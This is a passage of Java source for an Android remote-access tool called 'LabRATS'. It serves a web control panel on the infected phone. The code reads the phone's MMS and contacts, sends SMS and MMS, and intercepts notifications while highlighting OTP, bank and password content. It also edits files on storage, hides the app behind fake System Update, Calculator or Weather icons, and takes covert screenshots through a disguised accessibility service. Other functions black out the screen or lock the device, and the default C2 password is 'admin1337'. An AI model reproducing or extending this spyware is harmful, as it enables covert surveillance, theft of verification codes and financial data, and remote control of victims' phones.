                                .append("<div style=\"margin-top:5px;\"><a href=\"/mms/media/").append(part.substring(6)).append("\" target=\"_blank\" class=\"btn btn-small\" style=\"font-size:0.6rem; border-color:var(--neon-cyan); color:var(--neon-cyan);\">DOWNLOAD_VIDEO</a></div>");
                        }
                    }
                    html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/mms?page=1\">First</a>");
                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private String getMmsAddress(String mmsId) {
        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
        String address = "Unknown";
        try (Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null)) {
            if (c != null) {
                int addrIdx = c.getColumnIndex("address");
                while (c.moveToNext()) {
                    if (addrIdx != -1) {
                        String addr = c.getString(addrIdx);
                        if (addr != null && !addr.equals("insert-address-token")) {
                            address = addr;
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS address", e);
        }
        return address;
    }

    private List<String> getMmsParts(String mmsId) {
        List<String> parts = new ArrayList<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null)) {
            if (c != null) {
                int idIdx = c.getColumnIndex("_id");
                int ctIdx = c.getColumnIndex("ct");
                int textIdx = c.getColumnIndex("text");
                while (c.moveToNext()) {
                    if (idIdx == -1 || ctIdx == -1) continue;
                    String partId = c.getString(idIdx);
                    String type = c.getString(ctIdx);
                    if ("text/plain".equals(type)) {
                        String body = textIdx != -1 ? c.getString(textIdx) : null;
                        if (body == null && partId != null) body = getMmsText(partId);
                        if (body != null) parts.add("text:" + body);
                    } else if (type != null && type.startsWith("image/") && partId != null) {
                        parts.add("image:" + partId);
                    } else if (type != null && type.startsWith("video/") && partId != null) {
                        parts.add("video:" + partId);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS parts", e);
        }
        return parts;
    }

    private Set<String> getMmsIdsWithMedia() {
        Set<String> ids = new HashSet<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null)) {
            if (c != null) {
                int midIdx = c.getColumnIndex("mid");
                while (c.moveToNext()) {
                    if (midIdx != -1) {
                        String mid = c.getString(midIdx);
                        if (mid != null) ids.add(mid);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS IDs with media", e);
        }
        return ids;
    }

    private String getContactName(String number, Map<String, String> cache) {
        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
            return number == null ? "Unknown" : number;
        }

        if (cache != null && cache.containsKey(number)) {
            return cache.get(number);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return number;
            }
        }

        String result = number;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                if (name != null && !name.isEmpty()) {
                    result = name;
                }
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }

        if (cache != null) {
            cache.put(number, result);
        }
        return result;
    }

    private String formatMessageDate(long timestamp) {
        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(timestamp));
    }

    private String getMmsText(String partId) {
        Uri partUri = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try {
            InputStream is = context.getContentResolver().openInputStream(partUri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                is.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    private Response serveMmsMedia(String partId) {
        try {
            Uri uri = Uri.parse("content://mms/part/" + partId);
            String mimeType = "application/octet-stream";
            String extension = "bin";

            try (Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null)) {
                if (c != null && c.moveToFirst()) {
                    mimeType = c.getString(0);
                }
            } catch (Exception ignored) {}

            // Robust Extension detection
            if (mimeType != null) {
                if (mimeType.contains("video/quicktime") || mimeType.contains("video/mp4")) {
                    extension = "mp4";
                    mimeType = "video/mp4"; // Force mp4 for browser compatibility
                } else if (mimeType.startsWith("image/")) {
                    extension = mimeType.substring(mimeType.lastIndexOf("/") + 1);
                } else if (mimeType.startsWith("video/")) {
                    extension = mimeType.substring(mimeType.lastIndexOf("/") + 1);
                }
            }

            InputStream isRaw = context.getContentResolver().openInputStream(uri);
            if (isRaw == null) return serve404();
            InputStream is = new java.io.BufferedInputStream(isRaw, 65536);

            long size = -1;
            try {
                android.content.res.AssetFileDescriptor afd = context.getContentResolver().openAssetFileDescriptor(uri, "r");
                if (afd != null) {
                    size = afd.getLength();
                    afd.close();
                }
            } catch (Exception ignored) {}

            // Fallback for size
            if (size <= 0) {
                try {
                    size = is.available();
                } catch (Exception e) {
                    size = -1;
                }
            }

            Response res = (size > 0) ? 
                newFixedLengthResponse(Response.Status.OK, mimeType, is, size) :
                newChunkedResponse(Response.Status.OK, mimeType, is);

            res.addHeader("Accept-Ranges", "bytes");
            res.addHeader("Content-Disposition", "attachment; filename=\"mms_media_" + partId + "." + extension + "\"");
            return res;
        } catch (Exception e) { 
            Log.e("LabRATS", "MMS Media Error: " + e.getMessage());
            return serveError("Media Access Failed: " + e.getMessage());
        }
    }

    private Response sendSms(Map<String, String> params) {
        String number = params.get("number"), message = params.get("message");
        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
        try {
            logActivity("COMMS_DISPATCH: SMS sent to " + number);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
            }
            // --- API VIRTUALIZATION: Ghost SMS Dispatch ---
            String className = "android.telephony.SmsManager";
            Object smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                smsManager = context.getSystemService(SmsManager.class);
            } else {
                smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);
            }

            if (smsManager != null) {
                SystemAnalytics.safeCall(className, "sendTextMessage", 
                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                    smsManager, number, null, message, null, null);
            }

            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
    }

    private Response sendMms(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();

            String number = params.get("number");
            logActivity("COMMS_DISPATCH: MMS package sent to " + (number != null ? number : "unknown"));
            String message = params.get("message");
            String tempFilePath = files.get("media");

            if (number == null || number.isEmpty()) return serveError("Target number is required");
            if (tempFilePath == null) return serveError("Media attachment is required for MMS");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
                    return serveError("SEND_SMS permission not granted");
            }

            File fileToUpload = new File(tempFilePath);
            if (fileToUpload.length() > 1024 * 1024) {
                return serveError("Media package too large. Carrier limit is typically 1MB.");
            }

            boolean success = MmsSender.send(context, number, message, fileToUpload);

            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\">";
            if (success) {
                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>";
            } else {
                html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Could not dispatch media package. Check device logs.</p>";
            }
            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);

        } catch (Exception e) {
            return serveError("MMS Dispatch Error: " + e.getMessage());
        }
    }

    private Response serveIntel(Map<String, String> params, IHTTPSession session) {
        logActivity("INTEL_UPLINK: Notification stream accessed");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 15px;\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        // Reorganized Header
        html.append("<div class=\"card\">");
        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;\">");
        html.append("<h2 style=\"margin:0; text-align: left;\">&#9889; INTEL_STREAM</h2>");
        html.append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; text-align:right;\">LISTENER_ACTIVE</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        html.append("<div style=\"display:flex; gap:10px; margin-bottom:20px; max-width: 450px; margin-left:auto; margin-right:auto;\">");
        html.append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--danger); color:var(--danger); background:rgba(255, 49, 49, 0.05); margin: 0;\">CLEAR_STREAM</button>");
        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0, 242, 255, 0.05); margin: 0;\">RELOAD_STREAM</button>");
        html.append("</div>");

        // --- NOTIFICATION LIST WITH MARKER (STARTS AFTER CONTROLS) ---
        html.append("<div style=\"border-left: 3px solid var(--neon-cyan); padding-left: 15px; margin-top: 40px;\">");
        
        html.append("<script>function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }</script>");

        List<StatusNotification.NotificationData> notifications = StatusNotification.getHistory();

        if (notifications.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
        } else {
            // Pagination
            int page = 1;
            int limit = 20;
            try {
                if (params.containsKey("page")) {
                    page = Integer.parseInt(params.get("page"));
                    if (page < 1) page = 1;
                }
            } catch (Exception e) { page = 1; }
            
            int totalCount = notifications.size();
            int totalPages = (int) Math.ceil((double) totalCount / limit);
            int offset = (page - 1) * limit;

            html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                    .append(" reports | Page ").append(page).append(" of ").append(totalPages).append("</p>");

            html.append("<table id=\"intel-table\">")
                .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
                .append("<tbody>");

            for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                StatusNotification.NotificationData n = notifications.get(i);
                String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                
                // --- SENSITIVE DATA HIGHLIGHTING ---
                String payload = (n.title + " " + n.text).toLowerCase();
                
                // Exclude common system noise like "USB for file transfer"
                boolean isSystemNoise = payload.contains("usb") || payload.contains("charging");
                
                boolean isSensitive = !isSystemNoise && (
                                    payload.contains("otp") || 
                                    payload.contains("code") || 
                                    payload.contains("verification") || 
                                    payload.contains("bank") || 
                                    payload.contains("login") || 
                                    payload.contains("password") ||
                                    (payload.contains("transfer") && !payload.contains("file")) || 
                                    payload.contains("confirm"));
                
                String rowStyle = isSensitive ? "style=\"border-left: 3px solid var(--danger); background: rgba(255, 49, 49, 0.05);\"" : "";
                String alertBadge = isSensitive ? "<span style=\"color:var(--danger); font-size:0.6rem; display:block; margin-bottom:5px; font-weight:bold; letter-spacing:1px;\">&#9888; SENSITIVE_INTEL_DETECTED</span>" : "";

                html.append("<tr ").append(rowStyle).append(">")
                    .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
                    .append("<td>")
                    .append(alertBadge)
                    .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px;\">").append(escapeHtml(n.title)).append("</div>")
                    .append("<div style=\"font-size:0.8rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
                    .append("</td>")
                    .append("<td style=\"font-family:monospace; opacity:0.6;\">").append(time).append("</td>")
                    .append("</tr>");
            }
            html.append("</tbody></table>");
            
            // Pagination UI
            if (totalPages > 1) {
                html.append("<div class=\"pagination\" style=\"margin-top: 25px; flex-direction: column; gap: 12px;\">");
                
                html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");
                if (page > 1) {
                    html.append("<a href=\"/intel?page=1\">FIRST</a>");
                    html.append("<a href=\"/intel?page=").append(page - 1).append("\">&laquo; PREV</a>");
                }
                
                int startPage = Math.max(1, page - 1);
                int endPage = Math.min(totalPages, page + 1);
                for (int i = startPage; i <= endPage; i++) {
                    String active = (i == page) ? "class=\"active\"" : "";
                    html.append("<a ").append(active).append(" href=\"/intel?page=").append(i).append("\">").append(i).append("</a>");
                }

                if (page < totalPages) {
                    html.append("<a href=\"/intel?page=").append(page + 1).append("\">NEXT &raquo;</a>");
                    html.append("<a href=\"/intel?page=").append(totalPages).append("\">LAST</a>");
                }
                html.append("</div>");

                // Jump to page form
                html.append("<form action=\"/intel\" method=\"GET\" style=\"display: inline-flex; align-items: center; gap: 8px; margin-top: 5px;\">")
                    .append("<span style=\"font-size: 0.7rem; color: #888;\">JUMP:</span>")
                    .append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 55px; height: 32px; background: #000; border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; text-align: center; font-size: 0.8rem;\">")
                    .append("<button type=\"submit\" class=\"btn btn-small\" style=\"padding: 5px 10px; margin: 0;\">GO</button>")
                    .append("</form>");

                html.append("</div>");
            }
        }
        html.append("</div>");
        html.append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveFileEdit(String path, IHTTPSession session) {
        path = path.replace("%20", " ");
        logActivity("DATA_ACCESS: File editor opened - " + path);
        File file = new File(Environment.getExternalStorageDirectory(), path);
        if (!file.exists() || !file.isFile()) return serve404();

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        } catch (Exception e) {
            return serveError("Failed to read file: " + e.getMessage());
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
            .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
        
        html.append("<h2><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_CORE_DATA: ").append(file.getName()).append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        html.append("<div class=\"card\" style=\"padding:20px;\">");
        html.append("<form action=\"/files/save\" method=\"POST\">")
            .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
            .append("<textarea name=\"content\" style=\"width:100%; height:500px; background:#000; color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:12px; padding:15px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none;\" spellcheck=\"false\">")
            .append(escapeHtml(content.toString()))
            .append("</textarea>")
            .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
            .append("<button type=\"submit\" class=\"btn\">DEPLOY_CHANGES</button>")
            .append("</div>")
            .append("</form>");
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response saveFile(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            
            String path = params.get("path");
            String content = params.get("content");
            
            if (path == null) return serveError("Path is missing");
            File file = new File(Environment.getExternalStorageDirectory(), path);
            
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                fos.write(content.getBytes());
                logActivity("DATA_MODIFIED: File saved - " + path);
            }
            
            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Changes deployed successfully to storage.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Save Failed: " + e.getMessage());
        }
    }

    private Response toggleNightMode() {
        boolean current = Analytics_Provider.isNightModeEnabled(context);
        boolean newValue = !current;
        
        // Save to prefs directly from here
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putBoolean("night_mode", newValue).commit();
        
        logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
        
        Analytics_Provider service = Analytics_Provider.getInstance();
        if (service != null) {
            service.setNightMode(newValue);
        }
        
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + newValue + "}");
    }

    private Response toggleStealthMode(Map<String, String> params) {
        try {
            String type = params.get("type");
            if (type == null) type = "update";
            
            boolean forceRestore = "restore".equals(params.get("action"));
            boolean autoPilotToggle = "autopilot".equals(params.get("action"));
            
            if (autoPilotToggle) {
                boolean currentState = IO_Persistence_Manager.isAutoPilotEngaged();
                boolean newState = !currentState;
                IO_Persistence_Manager.setAutoPilot(newState);
                logActivity("COVERT_UPLINK: Tactical Auto-Pilot " + (newState ? "ENGAGED" : "OFF"));
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"autopilot\": " + newState + "}");
            }

            android.content.pm.PackageManager pm = context.getPackageManager();
            
            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            android.content.ComponentName updateAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
            android.content.ComponentName calcAlias = new android.content.ComponentName(context, "com.labs.labrats.CalculatorAlias");
            android.content.ComponentName weatherAlias = new android.content.ComponentName(context, "com.labs.labrats.WeatherAlias");
            android.content.ComponentName settingsAlias = new android.content.ComponentName(context, "com.labs.labrats.SettingsAlias");

            android.content.ComponentName targetAlias;
            switch(type) {
                case "calc": targetAlias = calcAlias; break;
                case "weather": targetAlias = weatherAlias; break;
                case "settings": targetAlias = settingsAlias; break;
                default: targetAlias = updateAlias; break;
            }

            if (forceRestore) {
                logActivity("STEALTH_EXECUTION: Stealth Mode DISABLED");
                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
            } else {
                logActivity("STEALTH_EXECUTION: Stealth Mode ENABLED (" + type + ")");
                // Disable ALL others first
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Enable target
                pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
            }

            // Force Refresh
            try {
                Intent home = new Intent(Intent.ACTION_MAIN);
                home.addCategory(Intent.CATEGORY_HOME);
                home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(home);
            } catch (Exception ignored) {}

            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": " + !forceRestore + ", \"autopilot\": " + (autoPilotToggle ? IO_Persistence_Manager.isAutoPilotEngaged() : "null") + "}");
        } catch (Exception e) {
            return serveError("Stealth error: " + e.getMessage());
        }
    }

    private Response updatePassword(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            String newPass = params.get("new_password");

            if (newPass == null || newPass.trim().isEmpty()) {
                return serveError("Invalid password");
            }

            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit()
                    .putString("c2_password", newPass.trim())
                    .apply();

            logActivity("SECURITY_PROTOCOL: Interface password updated");

            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to update password: " + e.getMessage());
        }
    }

    private String getStoredPassword() {
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getString("c2_password", "admin1337");
    }

    private Response serveCovertScreenshot() {
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost == null) return serveError("Ghost Service Offline");

        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        final byte[][] result = new byte[1][];
        final String[] error = new String[1];

        ghost.takeCovertScreenshot(new IO_Persistence_Manager.ScreenshotCallback() {
            @Override
            public void onSuccess(byte[] jpegData) {
                result[0] = jpegData;
                latch.countDown();
            }

            @Override
            public void onFailure(String err) {
                error[0] = err;
                latch.countDown();
            }
        });

        try {
            if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) { // Reduced timeout for speed
                if (result[0] != null) {
                    return newFixedLengthResponse(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
                } else {
                    return serveError("Screenshot Failed: " + error[0]);
                }
            } else {
                return serveError("Screenshot Timeout");
            }
        } catch (Exception e) {
            return serveError("Internal Error: " + e.getMessage());
        }
    }

    private Response serveGhostPage(IHTTPSession session) {
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; justify-content: flex-start; text-align: left;\">")
            .append("<span style=\"color:var(--neon-cyan);\">&#128123;</span> GHOST_CONTROLLER")
            .append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        boolean isActive = IO_Persistence_Manager.getInstance() != null;
        html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
        html.append("<div class=\"info-label\">GHOST_MODE_STATUS</div>");
        html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
            .append(isActive ? "<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>" : "<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>")
            .append("</div>");
        
        html.append("<div id=\"accessibility-prompt\" style=\"display: ").append(isActive ? "none" : "block").append("; text-align: left;\">");
        html.append("<p style=\"color:#888; font-size:0.8rem; margin-top:10px;\">Ghost Mode requires <b>Accessibility Permission</b>. Instruct the user to enable 'System Stability Service' in Accessibility settings.</p>");
        html.append("<button onclick=\"openSettings()\" class=\"btn btn-small\" style=\"margin-top:15px; border-radius:12px; padding: 10px 25px;\">OPEN_SETTINGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- GHOST_UTILITIES_SECTION ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin-bottom: 15px; font-size: 0.95rem; text-align: left;\">GHOST_UTILITIES</h2>");
        html.append("<div class=\"info-grid\">");
        
        // Blackout Protocol
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">BLACKOUT_PROTOCOL</div>");
        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight for physical stealth. Remote C2 feed remains visible.</p>");
        html.append("<div style=\"display:flex; gap:10px; width: 100%; max-width: 500px;\">");
        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"margin:0;\">ACTIVATE</button>");
        html.append("</div></div>");

        // System Denial Lock
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">SYSTEM_DENIAL_LOCK</div>");
        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Deploys a persistent, full-screen security overlay. Effectively locks the physical device.</p>");
        html.append("<div style=\"display:flex; gap:10px; width: 100%; max-width: 500px;\">");
        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">DEPLOY_LOCK</button>");
        html.append("</div></div>");

